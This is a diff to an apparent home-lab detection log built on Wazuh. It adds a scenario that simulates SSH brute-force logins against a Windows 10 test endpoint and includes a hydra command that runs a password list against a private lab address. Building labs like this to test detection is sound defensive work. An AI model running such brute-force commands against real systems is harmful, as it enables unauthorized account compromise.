@@ -19,3 +19,12 @@ Wazuh alert showing port scan fields
 
 ### Status
 Completed
+
+
+## Scenario 02 - SSH Brute Force
+
+### Objective
+Simulate repeated failed SSH login attempts against the Windows 10 endpoint.
+
+### Attack Command
+hydra -l testuser -P /home/kali/Desktop/passw.txt -u ssh://10.0.0.30
